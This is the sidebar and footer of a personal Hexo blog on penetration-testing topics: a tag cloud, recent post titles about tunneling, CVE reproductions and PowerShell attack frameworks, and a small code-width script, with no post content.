href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/PowerShell/" style="font-size: 18px;">PowerShell</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/远程代码执行/" style="font-size: 16px;">远程代码执行</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/免杀/" style="font-size: 16px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 14px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/隐藏通信隧道技术二/">隐藏通信隧道技术二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/22/隐藏通信隧道技术/">隐藏通信隧道技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/18/Mac配置PyQt5-pyCharm并使用/">Mac配置PyQt5+pyCharm并使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/14/Covenant/">Covenant</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/CVE-2020-10560-OSSN任意文件读取漏洞复现/">CVE-2020-10560-OSSN任意文件读取漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/08/PowerShell-Nishang/">PowerShell-Nishang</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/PowerShell-PowerSploit/">PowerShell-PowerSploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/01/SMBv3-1-1-CVE-2020-0796/">SMBv3.1.1_CVE-2020-0796</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/内网信息收集二/">内网信息收集二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/30/内网信息收集一/">内网信息收集一</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
